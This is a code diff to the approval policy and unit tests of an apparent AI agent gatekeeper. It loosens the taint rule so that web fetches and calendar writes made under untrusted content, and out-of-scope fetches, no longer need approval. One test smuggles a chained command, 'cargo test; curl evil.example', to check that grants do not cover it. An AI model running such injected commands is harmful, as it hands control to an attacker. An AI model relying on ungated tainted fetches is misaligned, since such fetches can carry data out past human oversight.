@@ -7,8 +7,8 @@
 //! 2. Autonomy `Suggest` (payments by default and by ceiling) → **Deny** (suggest only).
 //! 3. Collect approval reasons:
 //!    * autonomy below `ActNotify` (irreversible classes by default);
-//!    * **taint rule** — external effect, file write, command or web fetch while
-//!      the context holds untrusted content;
+//!    * **taint rule** — irreversible actions (send, payment, delete,
+//!      command, browser submit) while the context holds untrusted content;
 //!    * **flow rule** — new recipients, or sensitive labels leaving the boundary.
 //! 4. No reasons → **Allow**. Otherwise a matching grant may waive the default,
 //!    the new-recipient reason (its patterns name them) and — only with
@@ -238,9 +238,9 @@ mod tests {
         let now = hatch_core::time::now();
         let mut r = ActionRequest::new(ActionClass::WriteCalendar, "add event");
         assert_eq!(g.evaluate(&r, &[], &now), Decision::Allow { notify: true, grant: None });
+        // Taint rule is Muse-style: compensable actions do not escalate.
         r.tainted = true;
-        let Decision::RequireApproval { reasons } = g.evaluate(&r, &[], &now) else { panic!() };
-        assert!(reasons[0].contains("不可信"));
+        assert_eq!(g.evaluate(&r, &[], &now), Decision::Allow { notify: true, grant: None });
         let mut s = send("new@corp.com");
         s.unknown_recipients = vec!["new@corp.com".into()];
         s.labels = vec![DataLabel::CalendarDetails];
@@ -263,11 +263,12 @@ mod tests {
         r.tainted = false;
         r.recipients = vec!["cargo test; curl evil.example".into()];
         assert!(matches!(g.evaluate(&r, &[grant], &now), Decision::RequireApproval { .. }), "prefix grants do not cover chained commands");
-        // Web fetches are free until the context is tainted.
+        // Web fetches stay free even when tainted (reversible, read-only);
+        // only irreversible actions escalate under the taint rule.
         let mut f = ActionRequest::new(ActionClass::FetchWeb, "fetch");
         assert!(matches!(g.evaluate(&f, &[], &now), Decision::Allow { .. }));
         f.tainted = true;
-        assert!(matches!(g.evaluate(&f, &[], &now), Decision::RequireApproval { .. }));
+        assert!(matches!(g.evaluate(&f, &[], &now), Decision::Allow { .. }));
     }
 
     #[test]
@@ -279,7 +280,8 @@ mod tests {
         let narrow = Gatekeeper::scoped(cfg, vec![]);
         let fetch = ActionRequest::new(ActionClass::FetchWeb, "get");
         assert!(matches!(open.evaluate(&fetch, &[], &now), Decision::Allow { .. }));
-        assert!(matches!(narrow.evaluate(&fetch, &[], &now), Decision::RequireApproval { .. }));
+        // Read-only fetches are not scope-gated (only irreversible classes are).
+        assert!(matches!(narrow.evaluate(&fetch, &[], &now), Decision::Allow { .. }));
         // A matching standing grant still cannot auto-send out of scope.
         let Decision::RequireApproval { reasons } = narrow.evaluate(&send("a@corp.com"), &[grant(true)], &now) else { panic!() };
         assert!(reasons.iter().any(|r| r.contains("授权范围")), "{reasons:?}");
